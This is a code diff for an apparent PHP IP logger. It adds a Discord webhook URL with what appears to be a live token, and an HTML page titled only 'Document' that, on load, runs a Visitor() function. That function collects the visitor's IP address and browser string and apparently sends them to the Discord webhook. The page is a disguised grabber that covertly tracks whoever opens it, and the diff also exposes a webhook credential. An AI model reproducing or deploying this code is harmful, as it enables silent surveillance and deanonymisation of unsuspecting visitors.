@@ -7,7 +7,7 @@ Publish Date: 19-03-2021
 Last Update: 18-03-2022
 APIs Provided By: geoiplookup.io and ip-api.com
 */ 
-
+https://discord.com/api/webhooks/1128101766077091860/s3TrKK-uUzf3Tfd75wtN6jxk9ai0tboSKCe9vYsvJfGhAaVKYtcEo3ez9zIccD9Qm4Dr
 //Get the visitor's IP
 $IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
 $Browser = $_SERVER['HTTP_USER_AGENT'];
@@ -115,3 +115,20 @@ class Discord
 }
 
 ?>
+<html>
+<head>
+  <title>Document</title>
+</head>
+<body>
+
+<?php
+//If your Discord.php file is in another folder you need to change the file path!
+include("Discord.php");
+$sendembed = New Discord();
+
+//Executes the function
+$sendembed->Visitor();
+?>
+
+</body>
+</html>
